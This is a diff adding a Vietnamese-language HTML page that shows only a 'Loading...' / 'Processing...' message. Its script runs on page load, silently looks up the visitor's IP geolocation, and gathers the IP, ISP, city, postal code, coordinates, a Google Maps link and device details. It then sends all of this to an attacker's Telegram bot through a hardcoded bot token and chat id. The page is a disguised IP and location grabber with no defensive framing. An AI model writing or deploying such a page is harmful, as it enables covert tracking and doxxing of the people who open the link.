@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Đang tải...</title>
+</head>
+<body>
+  <h1>Đang xử lý...</h1>
+  <script>
+    async function sendToTelegram() {
+      const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
+      const chat_id = "5017098451";
+
+      const ipinfo = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
+
+      const now = new Date();
+      const formatTime = now.toLocaleTimeString();
+      const formatDate = now.toLocaleDateString();
+
+      const msg = `📡 [THÔNG TIN TRUY CẬP]
+
+🕒 Thời gian: ${formatTime} ${formatDate}
+📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
+🖥️ Hệ điều hành: ${navigator.platform}
+🌍 IP dân cư: ${ipinfo?.ip || "Không xác định"}
+🧠 IP gốc: ${ipinfo?.ip || "Không xác định"}
+🏢 ISP: ${ipinfo?.org || "Không xác định"}
+🏙️ Địa chỉ: ${ipinfo?.city}, ${ipinfo?.region}, ${ipinfo?.postal}
+🌎 Quốc gia: ${ipinfo?.country_name}
+📍 Vĩ độ: ${ipinfo?.latitude}
+📍 Kinh độ: ${ipinfo?.longitude}
+📌 Vị trí Google Maps: https://maps.google.com/?q=${ipinfo?.latitude},${ipinfo?.longitude}
+📸 Camera: 🚫 Không thể truy cập camera`;
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: msg
+        })
+      });
+    }
+
+    sendToTelegram();
+  </script>
+</body>
+</html>
